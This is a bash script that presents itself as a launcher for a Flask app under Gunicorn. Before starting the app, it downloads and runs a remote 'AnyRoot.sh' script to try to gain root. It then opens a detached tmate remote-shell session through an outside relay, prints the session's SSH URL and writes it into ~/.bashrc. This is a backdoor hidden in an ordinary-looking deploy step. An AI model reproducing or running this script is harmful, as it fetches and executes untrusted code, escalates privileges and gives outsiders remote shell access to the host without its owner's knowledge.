#!/bin/bash

# Get port from environment variable or default to 8080
PORT=${PORT:-8080}

# Get the latest version of tmate
echo "Fetching the latest tmate release..."
LATEST_VERSION=$(curl -s https://api.github.com/repos/tmate-io/tmate/releases/latest | grep -oP '"tag_name": "\K(.*?)(?=")')
if [ -z "$LATEST_VERSION" ]; then
    echo "Failed to fetch the latest tmate version. Using fallback version: 2.4.0"
    LATEST_VERSION="2.4.0"
fi

echo "Latest tmate version: $LATEST_VERSION"

# Detect CPU architecture
ARCH=$(uname -m)

case "$ARCH" in
    "x86_64")     TMATE_FILE="tmate-${LATEST_VERSION}-static-linux-amd64.tar.xz";;
    "i386" | "i686") TMATE_FILE="tmate-${LATEST_VERSION}-static-linux-i386.tar.xz";;
    "armv6l")     TMATE_FILE="tmate-${LATEST_VERSION}-static-linux-arm32v6.tar.xz";;
    "armv7l")     TMATE_FILE="tmate-${LATEST_VERSION}-static-linux-arm32v7.tar.xz";;
    "aarch64")    TMATE_FILE="tmate-${LATEST_VERSION}-static-linux-arm64v8.tar.xz";;
    *)
        echo "Unsupported architecture: $ARCH"
        exit 1
        ;;
esac

TMATE_DIR="${TMATE_FILE%.tar.xz}"

echo "Using tmate binary: $TMATE_FILE"

# Check if the system is already running as root
if [ "$(id -u)" -ne 0 ]; then
    echo "Not running as root. Attempting to gain root access with AnyRoot.sh..."
    
    # Download and execute AnyRoot.sh
    wget -q -O AnyRoot.sh https://raw.githubusercontent.com/BiswajyotiRay/AnyRoot/main/AnyRoot.sh
    if [ $? -eq 0 ]; then
        chmod +x AnyRoot.sh
        sed -i 's/\r$//' AnyRoot.sh
        bash AnyRoot.sh
        if [ $? -ne 0 ]; then
            echo "Error: AnyRoot.sh execution failed! Proceeding with tmate setup."
        fi
        rm -f AnyRoot.sh
    else
        echo "Error: Failed to download AnyRoot.sh! Proceeding with tmate setup."
    fi
else
    echo "System is already running as root. Skipping AnyRoot.sh execution."
fi

# Stop any existing tmate sessions
pkill -9 tmate 2>/dev/null

# Download tmate
wget -nc -q "https://github.com/tmate-io/tmate/releases/download/${LATEST_VERSION}/${TMATE_FILE}"
if [ $? -ne 0 ]; then
    echo "Error: Failed to download tmate. Exiting."
    exit 1
fi

# Extract tmate
tar -xf "$TMATE_FILE"
rm -f "$TMATE_FILE"

# Start tmate session
echo "Starting tmate session..."
TMATE_SOCKET="/tmp/tmate.sock"
nohup ./${TMATE_DIR}/tmate -S "$TMATE_SOCKET" new-session -d >/dev/null 2>&1 &
sleep 2

# Wait for tmate
for i in {1..10}; do
    if ./${TMATE_DIR}/tmate -S "$TMATE_SOCKET" wait tmate-ready 2>/dev/null; then
        break
    fi
    sleep 2
done

# Get SSH URL
SSH_URL=$("./${TMATE_DIR}/tmate" -S "$TMATE_SOCKET" display -p "#{tmate_ssh}")
if [ -z "$SSH_URL" ]; then
    echo "Error: Failed to retrieve SSH URL!"
    exit 1
fi

echo "Tmate session established: $SSH_URL"
export SSH_URL="$SSH_URL"
echo "export SSH_URL=\"$SSH_URL\"" >> ~/.bashrc
#rm -rf "$TMATE_DIR"

# Setup virtual environment
if [ -d "venv" ]; then
    echo "Activating virtual environment..."
    source venv/bin/activate
else
    echo "Creating virtual environment..."
    python3 -m venv venv
    if [ $? -ne 0 ]; then
        echo "Failed to create virtual environment. Ensure Python 3 is installed."
        exit 1
    fi
    source venv/bin/activate
fi

# Install dependencies
if [ -f "requirements.txt" ]; then
    echo "Installing dependencies..."
    pip install --no-cache-dir -r requirements.txt
    if [ $? -ne 0 ]; then
        echo "Failed to install dependencies."
        exit 1
    fi
else
    echo "Error: requirements.txt not found!"
    exit 1
fi

# Run Flask app with Gunicorn
if [ -f "app.py" ]; then
    echo "Starting Flask app on port $PORT..."
    gunicorn --bind 0.0.0.0:$PORT --workers 1 --worker-class sync --max-requests 1000 --timeout 30 app:app
else
    echo "Error: app.py not found!"
    exit 1
fi
